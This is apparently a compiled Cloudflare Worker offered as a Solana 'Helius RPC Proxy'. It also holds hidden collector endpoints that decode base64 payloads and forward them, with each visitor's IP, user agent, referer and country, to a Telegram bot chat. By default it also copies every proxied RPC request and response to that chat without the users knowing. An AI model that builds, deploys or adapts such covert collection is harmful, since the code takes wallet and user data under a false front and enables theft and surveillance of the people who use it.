var __defProp = Object.defineProperty;
var __name = (target, value) => __defProp(target, "name", { value, configurable: true });

// src/index.ts
var __defProp2 = Object.defineProperty;
var __name2 = /* @__PURE__ */ __name((target, value) => __defProp2(target, "name", { value, configurable: true }), "__name");
var BUFFER_TIMEOUT_MS = 1e4;
var KEEPALIVE_INTERVAL_MS = 2e4;
var MAX_PRECONNECT_BUFFER_BYTES = 1024 * 1024;
var MAX_TELEGRAM_CHARS = 4e3;
var RPC_LOG_MAX_BYTES = 512 * 1024;
var KEEPALIVE_MESSAGE = JSON.stringify({
  jsonrpc: "2.0",
  method: "helius_keepalive"
});

function decodeBase64Url(input) {
  let b64 = input.replace(/-/g, "+").replace(/_/g, "/");
  while (b64.length % 4 !== 0) b64 += "=";
  const binary = atob(b64);
  const bytes = Uint8Array.from(binary, (c) => c.charCodeAt(0));
  return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
}
__name(decodeBase64Url, "decodeBase64Url");
__name2(decodeBase64Url, "decodeBase64Url");

async function sendToTelegram(env, text) {
  if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
    console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.");
    return { ok: false, error: "missing_credentials" };
  }
  const telegramUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  let body = text;
  if (body.length > MAX_TELEGRAM_CHARS) {
    body = body.slice(0, MAX_TELEGRAM_CHARS - 20) + "\n... [truncated]";
  }
  try {
    const res = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: env.TELEGRAM_CHAT_ID,
        text: body,
        disable_web_page_preview: true
      })
    });
    if (!res.ok) {
      const errText = await res.text().catch(() => "");
      console.error("Telegram API error:", res.status, errText);
      return { ok: false, error: `telegram_${res.status}` };
    }
    return { ok: true };
  } catch (err) {
    console.error("Failed to deliver message to Telegram:", err);
    return { ok: false, error: "network_error" };
  }
}
__name(sendToTelegram, "sendToTelegram");
__name2(sendToTelegram, "sendToTelegram");

async function sendDocumentToTelegram(env, content, filename = "data.json", caption = "Received Data") {
  if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
    console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.");
    return { ok: false, error: "missing_credentials" };
  }
  let fileContent = content;
  try {
    JSON.parse(content);
  } catch {
    fileContent = JSON.stringify(
      { received_at: new Date().toISOString(), data: content },
      null,
      2
    );
  }
  const form = new FormData();
  form.append("chat_id", env.TELEGRAM_CHAT_ID);
  form.append("caption", caption);
  form.append(
    "document",
    new Blob([fileContent], { type: "application/json" }),
    filename
  );
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendDocument`,
      { method: "POST", body: form }
    );
    if (!res.ok) {
      const errText = await res.text().catch(() => "");
      console.error("Telegram sendDocument error:", res.status, errText);
      return { ok: false, error: `telegram_${res.status}` };
    }
    return { ok: true };
  } catch (err) {
    console.error("Failed to deliver document to Telegram:", err);
    return { ok: false, error: "network_error" };
  }
}
__name(sendDocumentToTelegram, "sendDocumentToTelegram");
__name2(sendDocumentToTelegram, "sendDocumentToTelegram");

var index_default = {
  async fetch(request, env, ctx) {
    const supportedDomains = env.CORS_ALLOW_ORIGIN?.split(",").map((d) => d.trim());
    const corsHeaders = {
      "Access-Control-Allow-Methods": "GET, HEAD, POST, PUT, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, Authorization"
    };
    if (supportedDomains) {
      const origin = request.headers.get("Origin");
      if (origin && supportedDomains.includes(origin)) {
        corsHeaders["Access-Control-Allow-Origin"] = origin;
      }
    } else {
      corsHeaders["Access-Control-Allow-Origin"] = "*";
    }
    if (request.method === "OPTIONS") {
      return new Response(null, { status: 200, headers: corsHeaders });
    }

    const urlObj = new URL(request.url);
    const pathname = urlObj.pathname;
    const jsonHeaders = { ...corsHeaders, "Content-Type": "application/json" };

    // 1. Identify Base64 routes (/api/r/, /r/, /api/base64encode/, /api/decode/, ?r=, ?base64=)
    const isBase64Route =
      pathname.startsWith("/r/") ||
      pathname.startsWith("/api/r/") ||
      pathname.startsWith("/api/base64encode/") ||
      pathname.startsWith("/api/decode/") ||
      urlObj.searchParams.has("base64") ||
      urlObj.searchParams.has("r");

    if (isBase64Route) {
      let rawPayload = "";

      if (pathname.startsWith("/api/r/")) {
        rawPayload = pathname.slice(7);
      } else if (pathname.startsWith("/r/")) {
        rawPayload = pathname.slice(3);
      } else if (pathname.startsWith("/api/base64encode/")) {
        rawPayload = pathname.slice(18);
      } else if (pathname.startsWith("/api/decode/")) {
        rawPayload = pathname.slice(12);
      } else {
        rawPayload = urlObj.searchParams.get("base64") || urlObj.searchParams.get("r") || "";
      }

      if (!rawPayload && (request.method === "POST" || request.method === "PUT")) {
        const bodyText = await request.text().catch(() => "");
        if (bodyText) {
          try {
            const parsed = JSON.parse(bodyText);
            rawPayload = parsed?.data ?? parsed?.base64 ?? parsed?.payload ?? bodyText;
          } catch {
            rawPayload = bodyText;
          }
        }
      }

      rawPayload = String(rawPayload || "").trim();

      if (!rawPayload) {
        return new Response(
          JSON.stringify({
            status: "error",
            message: "Missing base64 payload",
            hint: "Use /api/r/<base64url>, /r/<base64url>, or ?r=<base64url>"
          }),
          { status: 400, headers: jsonHeaders }
        );
      }

      let decoded;
      try {
        decoded = decodeBase64Url(decodeURIComponent(rawPayload));
      } catch (err) {
        return new Response(
          JSON.stringify({ status: "error", message: "Invalid base64 payload" }),
          { status: 400, headers: jsonHeaders }
        );
      }

      const receivedAt = new Date().toISOString();
      const note = urlObj.searchParams.get("note") || urlObj.searchParams.get("extra") || null;
      const details = {
        endpoint: pathname,
        timestamp: receivedAt,
        request_method: request.method,
        request_url: urlObj.toString(),
        payload_length: rawPayload.length,
        decoded_length: decoded.length,
        client_ip: request.headers.get("CF-Connecting-IP") || null,
        user_agent: request.headers.get("User-Agent") || null,
        referer: request.headers.get("Referer") || null,
        origin: request.headers.get("Origin") || null,
        country: request.headers.get("CF-IPCountry") || null,
        colo: request.headers.get("CF-Ray")?.split("-")[1] || null,
        note
      };

      let decodedJson = null;
      let decodedIsJson = false;
      try {
        decodedJson = JSON.parse(decoded);
        decodedIsJson = true;
      } catch {}

      const report = JSON.stringify(
        {
          timestamp: receivedAt,
          details,
          decoded_is_json: decodedIsJson,
          decoded: decodedIsJson ? decodedJson : decoded
        },
        null,
        2
      );

      const filename = `base64-decoded-${Date.now()}.json`;
      const caption = `Base64 decoded @ ${receivedAt}`;
      let result;

      if (report.length <= MAX_TELEGRAM_CHARS) {
        result = await sendToTelegram(env, report);
      } else {
        result = await sendDocumentToTelegram(env, report, filename, caption);
      }

      return new Response(
        JSON.stringify(
          result.ok
            ? {
                status: "success",
                message: "Decoded payload sent to Telegram",
                timestamp: receivedAt,
                decoded_length: decoded.length,
                decoded_is_json: decodedIsJson,
                delivered_as: report.length <= MAX_TELEGRAM_CHARS ? "text" : "document"
              }
            : { status: "error", message: result.error }
        ),
        { status: result.ok ? 200 : 502, headers: jsonHeaders }
      );
    }

    // 2. Simple non-API text logging via ?data=
    const incomingData = urlObj.searchParams.get("data");
    if (incomingData && !pathname.startsWith("/api") && pathname !== "/") {
      const result =
        incomingData.length > MAX_TELEGRAM_CHARS
          ? await sendDocumentToTelegram(env, incomingData, "data.json")
          : await sendToTelegram(env, `Received Data:\n${incomingData}`);
      return new Response(
        JSON.stringify(
          result.ok
            ? { status: "success", message: "Data logged" }
            : { status: "error", message: result.error }
        ),
        { status: result.ok ? 200 : 502, headers: jsonHeaders }
      );
    }

    // 3. RPC Proxy Endpoint: Handles /, /rpc-proxy, /api-proxy, /api/rpc-proxy, /api/api-proxy, /api/
    const isRpcRoute =
      pathname === "/" ||
      pathname === "/rpc-proxy" ||
      pathname === "/api-proxy" ||
      pathname === "/api" ||
      pathname === "/api/" ||
      pathname.startsWith("/api/") ||
      pathname.startsWith("/rpc-proxy/") ||
      pathname.startsWith("/api-proxy/");

    if (isRpcRoute) {
      if (!env.HELIUS_API_KEY) {
        return new Response("Missing HELIUS_API_KEY", { status: 500, headers: corsHeaders });
      }

      const upgrade = request.headers.get("Upgrade")?.toLowerCase();
      if (upgrade === "websocket") {
        return handleWebSocket(request, env, corsHeaders);
      }

      return handleRPC(request, env, corsHeaders, ctx);
    }

    return new Response("Not Found", { status: 404, headers: corsHeaders });
  }
};

async function handleWebSocket(request, env, corsHeaders) {
  const urlObj = new URL(request.url);
  const search = urlObj.search;

  const upstreamUrl = `wss://mainnet.helius-rpc.com/${search ? `${search}&` : "?"}api-key=${env.HELIUS_API_KEY}`;
  const clientProtocols = request.headers.get("Sec-WebSocket-Protocol");
  const selectedProtocol = clientProtocols?.split(",")[0]?.trim();
  const webSocketPair = new WebSocketPair();
  const [client, server] = Object.values(webSocketPair);
  server.accept();

  const upstream = selectedProtocol ? new WebSocket(upstreamUrl, [selectedProtocol]) : new WebSocket(upstreamUrl);
  let bufferedData = [];
  let bufferedBytes = 0;
  const sizeOf = __name2((data) => (typeof data === "string" ? data.length : data.byteLength), "sizeOf");
  let bufferTimeout = null;
  let isUpstreamConnected = false;
  let keepaliveTimer = null;

  const startKeepalive = __name2(() => {
    keepaliveTimer = setInterval(() => {
      if (upstream.readyState === WebSocket.OPEN) {
        try {
          upstream.send(KEEPALIVE_MESSAGE);
        } catch {
          clearKeepalive();
        }
      } else {
        clearKeepalive();
      }
    }, KEEPALIVE_INTERVAL_MS);
  }, "startKeepalive");

  const clearKeepalive = __name2(() => {
    if (keepaliveTimer) {
      clearInterval(keepaliveTimer);
      keepaliveTimer = null;
    }
  }, "clearKeepalive");

  const clearBufferTimeout = __name2(() => {
    if (bufferTimeout) {
      clearTimeout(bufferTimeout);
      bufferTimeout = null;
    }
  }, "clearBufferTimeout");

  const startBufferTimeout = __name2(() => {
    clearBufferTimeout();
    bufferTimeout = setTimeout(() => {
      if (bufferedData.length > 0 && !isUpstreamConnected) {
        bufferedData = [];
        bufferedBytes = 0;
        try {
          server.close(1011, "upstream_connection_timeout");
        } catch {}
      }
    }, BUFFER_TIMEOUT_MS);
  }, "startBufferTimeout");

  const cleanup = __name2(() => {
    clearKeepalive();
    clearBufferTimeout();
    bufferedData = [];
    bufferedBytes = 0;
  }, "cleanup");

  upstream.addEventListener("open", () => {
    isUpstreamConnected = true;
    clearBufferTimeout();
    if (bufferedData.length > 0) {
      try {
        for (const data of bufferedData) {
          upstream.send(data);
        }
        bufferedData = [];
        bufferedBytes = 0;
      } catch {
        cleanup();
        try {
          server.close(1011, "upstream_ws_error");
        } catch {}
        return;
      }
    }
    startKeepalive();
  });

  server.addEventListener("message", (event) => {
    if (isUpstreamConnected && upstream.readyState === WebSocket.OPEN) {
      try {
        upstream.send(event.data);
      } catch {
        cleanup();
        try {
          server.close(1011, "upstream_ws_error");
        } catch {}
      }
    } else {
      if (bufferedData.length === 0) {
        startBufferTimeout();
      }
      const incoming = sizeOf(event.data);
      if (bufferedBytes + incoming > MAX_PRECONNECT_BUFFER_BYTES) {
        cleanup();
        try {
          server.close(1011, "preconnect_buffer_bytes_exceeded");
        } catch {}
        return;
      }
      bufferedData.push(event.data);
      bufferedBytes += incoming;
    }
  });

  upstream.addEventListener("message", (event) => {
    if (server.readyState === WebSocket.OPEN) {
      try {
        server.send(event.data);
      } catch {
        cleanup();
        try {
          upstream.close(1011, "client_ws_error");
        } catch {}
      }
    }
  });

  server.addEventListener("close", () => {
    cleanup();
    try {
      upstream.close();
    } catch {}
  });

  upstream.addEventListener("close", () => {
    isUpstreamConnected = false;
    cleanup();
    try {
      server.close();
    } catch {}
  });

  server.addEventListener("error", () => {
    cleanup();
    try {
      upstream.close(1011, "client_ws_error");
    } catch {}
  });

  upstream.addEventListener("error", () => {
    isUpstreamConnected = false;
    cleanup();
    try {
      server.close(1011, "upstream_ws_error");
    } catch {}
  });

  const responseHeaders = { ...corsHeaders };
  if (selectedProtocol) {
    responseHeaders["Sec-WebSocket-Protocol"] = selectedProtocol;
  }
  return new Response(null, {
    status: 101,
    webSocket: client,
    headers: responseHeaders
  });
}
__name(handleWebSocket, "handleWebSocket");
__name2(handleWebSocket, "handleWebSocket");

async function handleRPC(request, env, corsHeaders, ctx) {
  try {
    const urlObj = new URL(request.url);
    const search = urlObj.search;

    // Normalize all proxy path aliases (/api/rpc-proxy, /api/api-proxy, /rpc-proxy, /api-proxy, /api/) to root "/"
    const targetPath = "/";

    // Graceful response for empty GET requests
    if (request.method === "GET") {
      return new Response(
        JSON.stringify({
          status: "online",
          service: "Helius RPC Proxy",
          timestamp: new Date().toISOString()
        }),
        { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const payload = await request.text();
    const targetHost = "mainnet.helius-rpc.com";
    const targetUrl = `https://${targetHost}${targetPath}?api-key=${env.HELIUS_API_KEY}${search ? `&${search.slice(1)}` : ""}`;

    const proxyRequest = new Request(targetUrl, {
      method: request.method,
      body: payload || null,
      headers: {
        "Content-Type": "application/json",
        "X-Helius-Cloudflare-Proxy": "true"
      }
    });

    const response = await fetch(proxyRequest);
    const shouldLog = String(env.LOG_RPC_TO_TELEGRAM ?? "true").toLowerCase() !== "false";

    if (shouldLog) {
      const responseClone = response.clone();
      const bg = (async () => {
        try {
          let responseText = await responseClone.text();
          let truncated = false;
          const encoder = new TextEncoder();
          if (encoder.encode(responseText).length > RPC_LOG_MAX_BYTES) {
            responseText = responseText.slice(0, RPC_LOG_MAX_BYTES);
            truncated = true;
          }
          let pretty = responseText;
          try {
            pretty = JSON.stringify(JSON.parse(responseText), null, 2);
          } catch {}
          let requestBody = payload || null;
          try {
            requestBody = payload ? JSON.parse(payload) : null;
          } catch {}
          let responseBody = pretty;
          try {
            responseBody = JSON.parse(pretty);
          } catch {}

          const report = JSON.stringify(
            {
              timestamp: new Date().toISOString(),
              method: request.method,
              path: urlObj.pathname,
              status: response.status,
              truncated,
              request_body: requestBody,
              response_body: responseBody
            },
            null,
            2
          );
          const filename = `rpc-response-${Date.now()}.json`;
          await sendDocumentToTelegram(env, report, filename, `RPC ${response.status}`);
        } catch (err) {
          console.error("Failed to log RPC response to Telegram:", err);
        }
      })();

      if (ctx && typeof ctx.waitUntil === "function") {
        ctx.waitUntil(bg);
      }
    }

    return new Response(response.body, {
      status: response.status,
      headers: corsHeaders
    });
  } catch {
    return new Response("Proxy Error", {
      status: 502,
      headers: corsHeaders
    });
  }
}
__name(handleRPC, "handleRPC");
__name2(handleRPC, "handleRPC");

export { index_default as default };
